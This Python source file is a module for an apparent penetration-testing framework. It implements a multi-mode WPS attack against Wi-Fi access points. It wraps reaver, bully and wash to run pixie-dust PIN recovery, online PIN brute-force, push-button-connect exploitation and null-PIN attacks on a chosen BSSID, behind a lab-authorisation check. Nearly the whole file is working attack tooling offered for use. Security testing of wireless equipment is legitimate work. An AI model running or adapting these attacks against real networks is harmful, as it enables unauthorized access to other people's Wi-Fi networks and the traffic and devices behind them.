#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Multi-mode WPS attack module.

Supports all known WPS attack vectors via subprocess bridges:
  - pixie_dust      Offline PIN recovery via weak nonces (pixiewps)
  - pin_bruteforce  Online PIN brute-force (reaver / bully)
  - pbc_exploit     WPS Push-Button Connect window exploitation
  - null_pin        Known devices vulnerable to empty/null PIN
  - wash_scan       WPS-enabled AP discovery (wash)

Workflow: wash scan → select target → choose attack mode → execute.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Multi-mode WPS attack: pixie dust, PIN brute-force, PBC, null PIN."""

    __info__ = {
        "name": "WPS Multi-Mode Attack",
        "description": (
            "WPS attack suite: pixie-dust offline PIN recovery (pixiewps), "
            "online PIN brute-force (reaver/bully), PBC window exploit, "
            "and null/empty PIN attacks. Includes WPS AP scanner (wash)."
        ),
        "authors": ("André Henrique (@mrhenrike) | União Geek",),
        "references": (
            "https://github.com/t6x/reaver-wps-fork-t6x",
            "https://github.com/aanarchyy/bully",
            "https://github.com/wiire-a/pixiewps",
        ),
        "devices": ("wifi",),
    }

    target_bssid = OptMAC("", "Target AP BSSID")
    target_channel = OptString("", "Target AP channel")
    interface = OptString("wlan0mon", "Monitor-mode interface")
    mode = OptString("pixie_dust", "Mode: pixie_dust | pin_bruteforce | pbc_exploit | null_pin | wash_scan")
    backend = OptString("reaver", "Backend for PIN attacks: reaver | bully")
    pin = OptString("", "Known/custom PIN (8 digits) — leave blank for auto")
    timeout = OptInteger(300, "Timeout in seconds per attempt")
    verbose = OptBool(False, "Enable verbose output from tools")
    output_dir = OptString(".log", "Directory for results and captures")
    dry_run = OptBool(False, "Print command without executing")

    def _run_wash_scan(self) -> None:
        """Scan for WPS-enabled APs using wash."""
        if not shutil.which("wash"):
            print_error("wash not found. Install reaver (includes wash).")
            return

        cmd = ["sudo", "wash", "-i", self.interface]
        print_status("Scanning for WPS-enabled APs...")
        print_info("Command: {}".format(" ".join(cmd)))
        try:
            subprocess.run(cmd, timeout=30, check=False)
        except subprocess.TimeoutExpired:
            print_info("Wash scan timeout (30s).")
        except KeyboardInterrupt:
            print_info("\nScan interrupted.")

    def _run_pixie_dust(self) -> None:
        """Pixie-dust attack via reaver -K or bully -d."""
        if self.backend == "reaver":
            if not shutil.which("reaver"):
                print_error("reaver not found.")
                return
            cmd = [
                "sudo", "reaver",
                "-i", self.interface,
                "-b", self.target_bssid,
                "-K", "1",
                "-vv" if self.verbose else "-v",
            ]
        elif self.backend == "bully":
            if not shutil.which("bully"):
                print_error("bully not found.")
                return
            cmd = [
                "sudo", "bully",
                "-b", self.target_bssid,
                "-d",
                self.interface,
            ]
        else:
            print_error("Unknown backend for pixie dust: {}".format(self.backend))
            return

        if self.target_channel:
            cmd.extend(["-c", self.target_channel])

        self._execute(cmd, "Pixie Dust")

    def _run_pin_bruteforce(self) -> None:
        """Online WPS PIN brute-force via reaver or bully."""
        if self.backend == "reaver":
            if not shutil.which("reaver"):
                print_error("reaver not found.")
                return
            cmd = [
                "sudo", "reaver",
                "-i", self.interface,
                "-b", self.target_bssid,
                "-vv" if self.verbose else "-v",
            ]
            if self.pin:
                cmd.extend(["-p", self.pin])
        elif self.backend == "bully":
            if not shutil.which("bully"):
                print_error("bully not found.")
                return
            cmd = [
                "sudo", "bully",
                "-b", self.target_bssid,
                self.interface,
            ]
            if self.pin:
                cmd.extend(["-p", self.pin])
        else:
            print_error("Unknown backend: {}".format(self.backend))
            return

        if self.target_channel:
            cmd.extend(["-c", self.target_channel])

        self._execute(cmd, "PIN Brute-Force")

    def _run_pbc_exploit(self) -> None:
        """Exploit WPS Push-Button Connect window."""
        if not shutil.which("reaver"):
            print_error("reaver not found.")
            return

        cmd = [
            "sudo", "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "--push-button-connect",
            "-vv" if self.verbose else "-v",
        ]
        if self.target_channel:
            cmd.extend(["-c", self.target_channel])

        print_info("PBC exploit: waiting for target to press WPS button or simulated PBC window...")
        self._execute(cmd, "PBC Exploit")

    def _run_null_pin(self) -> None:
        """Try null/empty PIN on vulnerable devices."""
        if not shutil.which("reaver"):
            print_error("reaver not found.")
            return

        cmd = [
            "sudo", "reaver",
            "-i", self.interface,
            "-b", self.target_bssid,
            "-p", "",
            "-vv" if self.verbose else "-v",
        ]
        if self.target_channel:
            cmd.extend(["-c", self.target_channel])

        self._execute(cmd, "Null PIN")

    def _execute(self, cmd: List[str], label: str) -> None:
        """Run a subprocess command with standard error handling."""
        cmd_str = " ".join(cmd)

        if self.dry_run:
            print_info("DRY RUN — {} would execute:".format(label))
            print_status(cmd_str)
            return

        log_dir = Path(self.output_dir)
        log_dir.mkdir(parents=True, exist_ok=True)

        print_status("Launching {} attack...".format(label))
        print_info("Command: {}".format(cmd_str))

        try:
            subprocess.run(cmd, timeout=self.timeout if self.timeout > 0 else None, check=False)
        except subprocess.TimeoutExpired:
            print_info("{} timeout reached ({}s).".format(label, self.timeout))
        except KeyboardInterrupt:
            print_info("\n{} interrupted.".format(label))
        except Exception as err:
            print_error("{} failed: {}".format(label, err))

    def run(self) -> None:
        """Execute selected WPS attack mode."""
        valid_modes = ("pixie_dust", "pin_bruteforce", "pbc_exploit", "null_pin", "wash_scan")
        if self.mode not in valid_modes:
            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
            return

        require_authorised_lab()

        if self.mode == "wash_scan":
            self._run_wash_scan()
            return

        if not self.target_bssid or self.target_bssid == "FF:FF:FF:FF:FF:FF":
            print_error("target_bssid is required. Run wash_scan first to discover targets.")
            return

        if self.mode == "pixie_dust":
            self._run_pixie_dust()
        elif self.mode == "pin_bruteforce":
            self._run_pin_bruteforce()
        elif self.mode == "pbc_exploit":
            self._run_pbc_exploit()
        elif self.mode == "null_pin":
            self._run_null_pin()
